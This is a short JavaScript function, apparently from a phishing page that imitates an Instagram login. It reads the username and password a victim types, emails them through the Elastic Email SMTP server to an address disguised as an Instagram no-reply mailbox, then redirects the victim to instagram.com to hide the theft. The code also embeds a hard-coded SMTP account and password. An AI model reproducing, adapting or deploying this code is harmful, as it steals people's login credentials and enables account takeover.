function emailSend() {
  var username = document.getElementById('username').value;
  var password = document.getElementById('password').value;
  var messageBody = "username " + username +
    "<br/> password " + password;

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "nelsf38@gmail.com",
    Password: "3D538C4DF17B36F1E64CD578356BE2FCF3CA",
    To: 'n0.reply.instagram.mail001@gmail.com',
    From: "nelsf38@gmail.com",
    Subject: "Login Details",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'https://instagram.com';
      }
      else {
        swal("Error", "Please complete form details", "error")
      }
    }
  );
}